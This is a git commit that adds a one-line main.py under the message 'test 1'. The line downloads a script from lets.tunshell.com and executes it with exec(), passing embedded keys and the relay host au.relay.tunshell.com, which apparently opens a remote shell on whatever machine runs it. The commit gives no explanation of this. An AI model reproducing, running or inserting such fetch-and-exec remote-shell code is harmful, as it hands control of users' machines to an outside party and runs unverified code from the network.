b0fbed3377239254ba8e0b642c76f2b94dd19b91
Ta-Ra-Ta <oliver@naka.edu.pl>
2024-12-05 17:18:31 +0700

    Create main.py
    test 1

---
+++ main.py
@@ -0,0 +1,1 @@
+import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","NwSnYfHDa92Gnbo9U0j2D4","pbLRzCvgaMvdihRGabxO4s","au.relay.tunshell.com"]})
